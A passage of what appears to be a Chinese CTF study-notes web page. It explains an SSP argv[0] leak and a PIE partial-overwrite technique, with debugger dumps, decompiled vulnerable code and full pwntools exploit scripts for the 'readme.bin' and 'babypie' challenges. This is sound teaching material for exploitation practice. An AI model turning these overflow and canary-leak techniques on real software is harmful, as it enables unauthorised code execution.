+<span class="m">01</span>:0008│      0x7fffffffdb68 —▸ 0x7ffff7ffd900 <span class="o">(</span>_rtld_global+2240<span class="o">)</span> ◂— 0x0
+<span class="m">02</span>:0010│      0x7fffffffdb70 —▸ 0x7ffff7fdd700 ◂— 0x7ffff7fdd700
+<span class="m">03</span>:0018│      0x7fffffffdb78 ◂— 0x0
+<span class="m">04</span>:0020│      0x7fffffffdb80 —▸ 0x7ffff7ffea88 —▸ 0x7ffff7ffe9b8 —▸ 0x7ffff7ffe728 —▸ 0x7ffff7ffe700 ◂— ...
+<span class="m">05</span>:0028│      0x7fffffffdb88 —▸ 0x7fffffffdbc0 ◂— 0x2
+<span class="m">06</span>:0030│      0x7fffffffdb90 ◂— 0x380
+<span class="m">07</span>:0038│      0x7fffffffdb98 —▸ 0x7fffffffdbb0 ◂— 0xffffffff
+</code></pre></div>
+<p>从 18 行或 33 行可以得出 flag 存放地址为：0x600d28 。另外一个 bss 段内的 flag 地址使用 peda find 功能查找，两个 flag 地址分别为： 0x600d28 、0x400d28。</p>
+<p>这里需要减去偏移（被 name 覆盖了 0x7 ）才能得到完整 flag ，所以两个 flag 地址为：0x600d21 、0x400d21</p>
+<div class="highlight"><pre><span></span><code>gdb-peda$ find Serv
+Searching <span class="k">for</span> <span class="s1">&#39;Serv&#39;</span> <span class="k">in</span>: None ranges
+Found <span class="m">6</span> results, display max <span class="m">6</span> items:
+readme.bin : 0x400d28 <span class="o">(</span><span class="s2">&quot;ServerHasTheFlagHere...&quot;</span><span class="o">)</span>
+readme.bin : 0x600d28 <span class="o">(</span><span class="s2">&quot;ServerHasTheFlagHere...&quot;</span><span class="o">)</span>
+      libc : 0x7ffff7b97641 <span class="o">(</span><span class="s2">&quot;Servname not supported for ai_socktype&quot;</span><span class="o">)</span>
+      libc : 0x7ffff7b9924c <span class="o">(</span><span class="s2">&quot;Server rejected credential&quot;</span><span class="o">)</span>
+      libc : 0x7ffff7b9927f <span class="o">(</span><span class="s2">&quot;Server rejected verifier&quot;</span><span class="o">)</span>
+      libc : 0x7ffff7b994af <span class="o">(</span><span class="s2">&quot;Server can&#39;t decode arguments&quot;</span><span class="o">)</span>
+</code></pre></div>
+<h4 id="_15">确定偏移<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h4>
+<p>下面，我们确定 argv[0] 距离读取的字符串的偏移。</p>
+<p>首先下断点在 main 函数入口处，如下</p>
+<div class="highlight"><pre><span></span><code>gef➤  b *0x00000000004006D0
+Breakpoint <span class="m">1</span> at 0x4006d0
+gef➤  r
+Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes 
+
+Breakpoint <span class="m">1</span>, 0x00000000004006d0 <span class="k">in</span> ?? <span class="o">()</span>
+ code:i386:x86-64 <span class="o">]</span>────
+     0x4006c0 &lt;_IO_gets@plt+0&gt; jmp    QWORD PTR <span class="o">[</span>rip+0x20062a<span class="o">]</span>        <span class="c1"># 0x600cf0 &lt;_IO_gets@got.plt&gt;</span>
+     0x4006c6 &lt;_IO_gets@plt+6&gt; push   0x9
+     0x4006cb &lt;_IO_gets@plt+11&gt; jmp    0x400620
+ →   0x4006d0                  sub    rsp, 0x8
+     0x4006d4                  mov    rdi, QWORD PTR <span class="o">[</span>rip+0x200665<span class="o">]</span>        <span class="c1"># 0x600d40 &lt;stdout&gt;</span>
+     0x4006db                  xor    esi, esi
+     0x4006dd                  call   0x400660 &lt;setbuf@plt&gt;
+──────────────────────────────────────────────────────────────────<span class="o">[</span> stack <span class="o">]</span>────
+<span class="o">[</span><span class="s1">&#39;0x7fffffffdb78&#39;</span>, <span class="s1">&#39;l8&#39;</span><span class="o">]</span>
+<span class="m">8</span>
+0x00007fffffffdb78│+0x00: 0x00007ffff7a2d830  →  &lt;__libc_start_main+240&gt; mov edi, eax    ← <span class="nv">$rsp</span>
+0x00007fffffffdb80│+0x08: 0x0000000000000000
+0x00007fffffffdb88│+0x10: 0x00007fffffffdc58  →  0x00007fffffffe00b  →  <span class="s2">&quot;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/exam[...]&quot;</span>
+0x00007fffffffdb90│+0x18: 0x0000000100000000
+0x00007fffffffdb98│+0x20: 0x00000000004006d0  →   sub rsp, 0x8
+0x00007fffffffdba0│+0x28: 0x0000000000000000
+0x00007fffffffdba8│+0x30: 0x48c916d3cf726fe3
+0x00007fffffffdbb0│+0x38: 0x00000000004006ee  →   xor ebp, ebp
+──────────────────────────────────────────────────────────────<span class="o">[</span> trace <span class="o">]</span>────
+<span class="o">[</span><span class="c1">#0] 0x4006d0 → sub rsp, 0x8</span>
+<span class="o">[</span><span class="c1">#1] 0x7ffff7a2d830 → Name: __libc_start_main(main=0x4006d0, argc=0x1, argv=0x7fffffffdc58, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdc48)</span>
+---Type &lt;<span class="k">return</span>&gt; to <span class="k">continue</span>, or q &lt;<span class="k">return</span>&gt; to quit---
+<span class="o">[</span><span class="c1">#2] 0x400717 → hlt </span>
+</code></pre></div>
+<p>可以看出 0x00007fffffffe00b 指向程序名，其自然就是 argv[0]，所以我们修改的内容就是这个地址。同时 0x00007fffffffdc58 处保留着该地址，所以我们真正需要的是 0x00007fffffffdc58 的值。</p>
+<p>argv[0] 读入方式看 16 行，系统到 0x00007fffffffdc58 找到地址，然后取地址的值。</p>
+<div class="highlight"><pre><span></span><code>────────────────────────────────────────────────────────────────────────────────────<span class="o">[</span> REGISTERS <span class="o">]</span>─────────────────────────────────────────────────────────────────────────────────────
+ RAX  0x7fffffffdda8 —▸ 0x400d21 ◂— xor    al, byte ptr <span class="o">[</span>rbx + 0x33<span class="o">]</span> /* <span class="s1">&#39;2C3_TheServerHasTheFlagHere...&#39;</span> */
+ RBX  0x1
+ RCX  0x0
+ RDX  0x7ffff7b9c481 ◂— jae    0x7ffff7b9c4f7 /* <span class="s1">&#39;stack smashing detected&#39;</span> */
+ RDI  0x1
+ RSI  0x7ffff7b9c49f ◂— sub    ch, byte ptr <span class="o">[</span>rdx<span class="o">]</span> /* <span class="s1">&#39;*** %s ***: %s terminated\n&#39;</span> */
+……
+ RBP  0x7ffff7b9c481 ◂— jae    0x7ffff7b9c4f7 /* <span class="s1">&#39;stack smashing detected&#39;</span> */
+ RSP  0x7fffffffdb60 ◂— 0x4
+ RIP  0x7ffff7b2614b <span class="o">(</span>__fortify_fail+75<span class="o">)</span> ◂— mov    rcx, qword ptr <span class="o">[</span>rax<span class="o">]</span>
+──────────────────────────────────────────────────────────────────────────────────────<span class="o">[</span> DISASM <span class="o">]</span>──────────────────────────────────────────────────────────────────────────────────────
+……
+   0x7ffff7b26146 &lt;__fortify_fail+70&gt;    mov    rdx, rbp
+   0x7ffff7b26149 &lt;__fortify_fail+73&gt;    mov    edi, ebx
+ ► 0x7ffff7b2614b &lt;__fortify_fail+75&gt;    mov    rcx, qword ptr <span class="o">[</span>rax<span class="o">]</span>
+   ……
+</code></pre></div>
+<p>剩下就是找到溢出点写入字符串的栈地址，在<a href="# 确定 flag 地址">确定 flag 地址</a> 中的第一个调试中的 53 行找到 name 存放地址：0x7fffffffdb60</p>
+<h4 id="_16">利用程序<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+
+<span class="n">p</span> <span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">&quot;./readme.bin&quot;</span><span class="p">)</span>
+
+<span class="n">flag1</span> <span class="o">=</span> <span class="mh">0x600d21</span>
+<span class="n">flag2</span> <span class="o">=</span> <span class="mh">0x400d21</span>
+
+<span class="n">argv0</span> <span class="o">=</span> <span class="mh">0x7fffffffdd78</span>
+<span class="n">name</span> <span class="o">=</span> <span class="mh">0x7fffffffdb60</span><span class="c1">#0x7fffffffdca8</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="n">argv0</span><span class="o">-</span><span class="n">name</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">flag2</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;name? &quot;</span><span class="p">)</span>
+<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;flag: &quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;skye&quot;</span><span class="p">)</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="partial-overwrite">栈上的 partial overwrite<a class="headerlink" href="#partial-overwrite" title="Permanent link">&para;</a></h2>
+<p>partial overwrite 这种技巧在很多地方都适用, 这里先以栈上的 partial overwrite 为例来介绍这种思想。</p>
+<p>我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。</p>
+<p>更全面的 PIE 保护绕过看萝卜师傅的：<a href="https://www.anquanke.com/post/id/177520">PIE保护详解和常用bypass手段</a></p>
+<h3 id="2018-babypie">2018 - 安恒杯 - babypie<a class="headerlink" href="#2018-babypie" title="Permanent link">&para;</a></h3>
+<p>以安恒杯 2018 年 7 月月赛的 babypie 为例分析这一种利用技巧, 题目的 binary 放在了 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/partial_overwrite">ctf-challenge</a> 中</p>
+<h4 id="_17">保护<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      PIE enabled
+</code></pre></div>
+<h4 id="_18">分析程序<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h4>
+<p>明显的栈溢出漏洞, 需要注意的是在输入之前, 程序对栈空间进行了清零, 这样我们就无法通过打印栈上信息来 leak binary 或者 libc 的基址了</p>
+<div class="highlight"><pre><span></span><code>__int64 sub_960()
+{
+  __int128 name; // [rsp+0h] [rbp-30h]
+  __int128 v2; // [rsp+10h] [rbp-20h]
+  unsigned __int64 v3; // [rsp+28h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  name = 0uLL;
+  v2 = 0uLL;
+  puts(&quot;Input your Name:&quot;);
+  read(0, &amp;name, 0x30uLL);                      // 栈溢出
+  printf(&quot;Hello %s:\n&quot;, &amp;name, name, v2);
+  read(0, &amp;name, 0x60uLL);                      // 栈溢出
+  return 0LL;
+}
+</code></pre></div>
+<p>程序有留有后门 sub_A3E  。</p>
+<h4 id="_19">思路<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h4>
+<p>泄露 libc 地址的话，就需要将栈上最近的 libc 地址前的 \x00 覆盖掉。而最近的 libc 地址（__libc_start_main+240）需要覆盖 0x58 ，显然溢出长度不够。</p>
+<p>所以选择控制 rip 跳转到后门函数。程序开启了 PIE 和 Canary 栈溢出保护，首先是泄露出 canary 值，然后再次栈溢出控制 rip 跳转。</p>
+<h5 id="leak-canary">leak canary<a class="headerlink" href="#leak-canary" title="Permanent link">&para;</a></h5>
+<p>sub_960 栈结构在 ida 中分析如下：</p>
+<div class="highlight"><pre><span></span><code>0000000000000030 name            xmmword ?
+-0000000000000020 var_20          xmmword ?
+-0000000000000010                 db ? ; undefined
+-000000000000000F                 db ? ; undefined
+-000000000000000E                 db ? ; undefined
+-000000000000000D                 db ? ; undefined
+-000000000000000C                 db ? ; undefined
+-000000000000000B                 db ? ; undefined
+-000000000000000A                 db ? ; undefined
+-0000000000000009                 db ? ; undefined
+-0000000000000008 var_8           dq ?
++0000000000000000  s              db 8 dup(?)
++0000000000000008  r              db 8 dup(?)
+</code></pre></div>
+<p>在第一个输入 name 时，可以写入 0x29 字节，输出名字时会将 canary 也一起输出。 </p>
+<div class="highlight"><pre><span></span><code><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x30</span><span class="o">-</span><span class="mh">0x8</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Name:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x30</span><span class="o">-</span><span class="mh">0x8</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;canary:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
+</code></pre></div>
+<h5 id="partial-overwrite_1">partial overwrite<a class="headerlink" href="#partial-overwrite_1" title="Permanent link">&para;</a></h5>
+<p>虽然程序开启了 PIE ，但是由于低 12 位的页内偏移是固定的，也就 ida 中能看到的部分，这条题就是低三位。</p>
+<p>后门函数的地址为：0xA3E。由于输入的时候是一个字节，也就是 0x3E 这样输入，但是第 4 个数字是随机的，所以我们需要找一个**跳转 text 段**、**第三位是 A **的rip 进行覆盖。</p>
+<p>我们写入 name 的函数运行结束后会返回 main 函数，main 函数在 text 段(（0x555555554a3e）：</p>
+<div class="highlight"><pre><span></span><code>pwndbg&gt; 
+0x0000555555554a3d <span class="k">in</span> ?? <span class="o">()</span>
+LEGEND: STACK <span class="p">|</span> HEAP <span class="p">|</span> CODE <span class="p">|</span> DATA <span class="p">|</span> RWX <span class="p">|</span> RODATA
+─────────────────────────────────<span class="o">[</span> REGISTERS <span class="o">]</span>──────────────────────────────────
+ RAX  0x0
+ RBX  0x0
+ RCX  0x0
+ RDX  0x60
+ RDI  0x0
+ RSI  0x7fffffffdc80 ◂— <span class="s1">&#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;</span>
+ R8   0x7ffff7fdd700 ◂— 0x7ffff7fdd700
+ R9   0x3e
+ R10  0x36
+ R11  0x346
+ R12  0x555555554830 ◂— xor    ebp, ebp
+ R13  0x7fffffffddb0 ◂— 0x1
+ R14  0x0
+ R15  0x0
+ RBP  0xdeadbeef
+ RSP  0x7fffffffdcb8 —▸ 0x555555554a3e ◂— push   rbp
+ RIP  0x555555554a3d ◂— ret    
+───────────────────────────────────<span class="o">[</span> DISASM <span class="o">]</span>───────────────────────────────────
+   0x555555554a23    mov    eax, <span class="m">0</span>
+   0x555555554a28    mov    rcx, qword ptr <span class="o">[</span>rbp - <span class="m">8</span><span class="o">]</span>
+   0x555555554a2c    xor    rcx, qword ptr fs:<span class="o">[</span>0x28<span class="o">]</span>
+   0x555555554a35    je     0x555555554a3c
+    ↓
+   0x555555554a3c    leave  
+</code></pre></div>
+<p>所以在第二次输入 name 时溢出覆盖 rip 最后一个字节：</p>
+<div class="highlight"><pre><span></span><code><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x30</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x3e</span><span class="s1">&#39;</span>
+</code></pre></div>
+<h4 id="_20">利用程序<a class="headerlink" href="#_20" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./babypie&quot;</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./babypie&quot;</span><span class="p">)</span>
+
+<span class="n">getshell</span> <span class="o">=</span> <span class="mh">0xA3E</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x30</span><span class="o">-</span><span class="mh">0x8</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Name:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x30</span><span class="o">-</span><span class="mh">0x8</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;canary:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x30</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x3e</span><span class="s1">&#39;</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            <span>&copy; 2021</span>by <a href="https://www.mrskye.cn/" target="_blank">SkYe231</a> &nbsp;|&nbsp; <span><a href="http://beian.miit.gov.cn/" target="_blank">粤ICP备20056619号</a></span>
+          </div>
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../assets/javascripts/vendor.93c04032.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.83e5331e.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../../..",
+          features: {'tabs': True},
+          search: Object.assign({
+            worker: "../../../assets/javascripts/worker/search.8c7e0a7e.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+    
+  </body>
+</html>
